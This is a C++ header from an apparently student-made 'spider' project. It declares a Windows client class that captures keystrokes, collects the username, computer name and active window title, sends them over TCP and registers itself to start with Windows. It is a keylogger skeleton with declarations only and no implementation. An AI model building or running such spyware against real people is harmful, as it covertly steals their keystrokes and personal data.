/*
** Client.hpp for cpp_spider in cpp_spider\Client\Headers
**
** Made by august_t
** Login   <august_t@epitech.net>
**
** Started on  Fri Sep 29 14:27:49 2017 august_t
** Last update Sun Oct 08 22:45:06 2017 fagnol_r
*/

#ifndef _CLIENT_HPP_
#define _CLIENT_HPP_

#define _WIN32_WINNT 0x0502

#include <array>
#include <memory>
#include <cstdlib>
#include <utility>
#include <ctime>
#include <sstream>
#include <type_traits>
#include <boost/asio.hpp>
#include <boost/asio/write.hpp>
#include <boost/array.hpp>
#include <boost/bind.hpp>
#include <boost/archive/text_oarchive.hpp>
#include <boost/archive/text_iarchive.hpp>
#include <boost/tuple/tuple_io.hpp>
#include <boost/tuple/tuple.hpp>
#include <boost/tuple/tuple_comparison.hpp>
#include <boost/shared_ptr.hpp>
#include <boost/enable_shared_from_this.hpp>
#include <boost/lexical_cast.hpp>
#include "KeyboardEvent.hpp"
#include <Lmcons.h>


class   Client : public boost::enable_shared_from_this<Client>
{
private:
  bool          _isConnected;
  bool          _needSend;
  std::string   _ip;
  int           _port;
  int           *_protocol;
  boost::asio::ip::tcp::socket    _socket;
  boost::asio::ip::tcp::endpoint  _endpoint;
  boost::asio::io_service         _ios;
  std::string                     _message;
  boost::asio::streambuf          _buf;
  KeyboardEvent                   _key;
public:
  typedef boost::shared_ptr<Client> pointer;
  Client(boost::asio::io_service& io_service);
  ~Client();
  void                  clientVerif(const boost::system::error_code& error);
  void                  clientRead(const boost::system::error_code& error);
  boost::asio::ip::tcp::socket&  createSocket();
  void                  clientWrite(const boost::system::error_code& error, std::string data);
  void                  sendKeyStrokes(const boost::system::error_code& error);
  static pointer        createPointer(boost::asio::io_service& io_service);
  bool                  isConnected();
  void                  connect();
  void                  connectVerif(const boost::system::error_code& error);
  void                  start();
  void                  stop();
  void                  checkConnection(const boost::system::error_code& error);
  void                  connectVerif2(const boost::system::error_code& error);
  void                  timer();
  std::string           getUsername();
  std::string           getComputerName();
  std::string           getActiveWindowTitle();
  void                  startWithWindows();
};

#endif /* !_CLIENT_HPP_ */
